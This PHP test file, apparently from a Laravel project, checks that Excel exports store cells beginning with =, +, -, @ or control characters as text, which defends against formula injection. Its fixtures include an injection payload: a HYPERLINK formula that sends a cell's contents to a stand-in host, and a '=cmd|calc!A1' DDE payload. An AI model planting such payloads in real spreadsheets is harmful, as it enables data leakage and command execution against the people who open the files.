<?php

declare(strict_types=1);

use App\Enums\Reporte;
use App\Exports\ListaDeReposicionExport;
use App\Exports\UsoDeEscenariosExport;
use App\Models\CasoClinico;
use App\Models\LineaDeReposicion;
use App\Models\Materia;
use App\Models\Preparacion;
use App\Models\Sala;
use App\Models\Solicitud;
use App\Models\User;
use App\Services\FiltroReporte;
use App\Services\GeneradorDeReportes;
use App\Services\ReporteService;
use Database\Seeders\RolSeeder;
use Maatwebsite\Excel\Excel as FormatoExcel;
use Maatwebsite\Excel\Facades\Excel;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;

/*
 * QA-08 (CWE-1236): un texto que empieza por = + - @ no puede abrirse en
 * Excel como fórmula. La lista de reposición se entrega como soporte de una
 * carta de compra y la abren otras personas.
 */

beforeEach(function (): void {
    $this->seed(RolSeeder::class);
});

/**
 * Escribe el export en un xlsx y lo lee de vuelta, para ver el tipo real de
 * cada celda y no lo que PHP cree haber escrito.
 *
 * @return list<list<array{valor: mixed, tipo: string}>>
 */
function celdasDeLaHoja(object $exportacion): array
{
    $ruta = tempnam(sys_get_temp_dir(), 'xlsx');
    file_put_contents($ruta, Excel::raw($exportacion, FormatoExcel::XLSX));
    $hoja = IOFactory::load($ruta)->getActiveSheet();
    unlink($ruta);

    $celdas = [];

    foreach ($hoja->getRowIterator() as $fila) {
        $celdasDeLaFila = [];

        foreach ($fila->getCellIterator() as $celda) {
            $celdasDeLaFila[] = ['valor' => $celda->getValue(), 'tipo' => $celda->getDataType()];
        }

        $celdas[] = $celdasDeLaFila;
    }

    return $celdas;
}

it('guarda como texto una descripción que empieza por = en la lista de reposición', function (string $peligroso): void {
    LineaDeReposicion::factory()->create(['descripcion' => $peligroso, 'cantidad' => 7]);
    $exportacion = app(GeneradorDeReportes::class)->exportador(
        Reporte::ListaDeReposicion,
        new FiltroReporte(listaDeReposicionId: LineaDeReposicion::query()->value('lista_reposicion_id')),
    );

    $celdas = celdasDeLaHoja($exportacion);
    $descripcion = $celdas[1][0];

    expect($descripcion['tipo'])->toBe(DataType::TYPE_STRING)
        ->and(trim((string) $descripcion['valor']))->toBe(trim($peligroso))
        // Los números siguen siendo números: se pueden sumar.
        ->and($celdas[1][2]['tipo'])->toBe(DataType::TYPE_NUMERIC);
})->with([
    'hipervínculo' => ['=HYPERLINK("https://ejemplo.invalid/?d="&A1,"Ver cotización")'],
    'suma' => ['+SUM(A1:A9)'],
    'resta' => ['-2+3'],
    'arroba' => ['@SUM(1)'],
    'tabulador' => ["\t=1+1"],
    'retorno' => ["\r=1+1"],
]);

it('guarda como texto un nombre que empieza por = en el reporte de uso de escenarios', function (): void {
    $docente = User::factory()->docente()->create(['nombre' => '=cmd|calc!A1']);
    $solicitud = Solicitud::factory()->aprobada()->create([
        'docente_id' => $docente->id,
        'materia_id' => Materia::factory()->create()->id,
        'caso_clinico_id' => CasoClinico::factory()->create()->id,
        'fecha' => '2026-04-10',
    ]);
    Preparacion::factory()->create(['solicitud_id' => $solicitud->id, 'sala_id' => Sala::factory()->create()->id]);

    $exportacion = new UsoDeEscenariosExport(app(ReporteService::class)->usoDeEscenarios(new FiltroReporte(desde: '2026-04-01', hasta: '2026-04-30')));
    $tipos = collect(celdasDeLaHoja($exportacion)[1])->pluck('tipo', 'valor');

    expect($tipos['=cmd|calc!A1'])->toBe(DataType::TYPE_STRING)
        ->and($tipos->contains(DataType::TYPE_FORMULA))->toBeFalse();
});

it('no toca un texto normal', function (): void {
    LineaDeReposicion::factory()->create(['descripcion' => 'Gasas estériles']);
    $exportacion = new ListaDeReposicionExport(LineaDeReposicion::query());

    expect(celdasDeLaHoja($exportacion)[1][0]['valor'])->toBe('Gasas estériles');
});
